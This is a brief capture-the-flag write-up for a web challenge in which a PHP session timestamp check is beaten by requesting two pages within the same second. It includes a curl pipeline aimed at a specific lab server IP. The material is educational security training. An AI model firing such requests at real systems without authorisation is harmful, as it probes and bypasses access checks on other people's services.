# Web: Web Basics: Produce-Consume

## Description

The challenge includes two key endpoints:
● produce.php sets *$_SESSION['time'] = time();*
● consume.php reveals the flag **only if** *$_SESSION['time'] == time()* at the moment of
access.

## Vulnerability

The server checks if the session time equals the current time, but time() is only accurate to
the second. So, if we hit produce.php and immediately consume.php **within the same
second** , we can leak the flag.

## Exploitation

To solve the challenge we used a command to access both pages in same time (or refresh
both pages in same time on browser):
**curl -c - [http://141.85.224.70:8091/produce-consume/produce.php](http://141.85.224.70:8091/produce-consume/produce.php) | curl -b -
[http://141.85.224.70:8091/produce-consume/consume.php](http://141.85.224.70:8091/produce-consume/consume.php)**

![image](https://github.com/andreipopescufilimon/SSS-Web-v12-Write-Ups/blob/main/SSS%20v12%20Session%2001/images-s1/Produce-Consume.jpg)
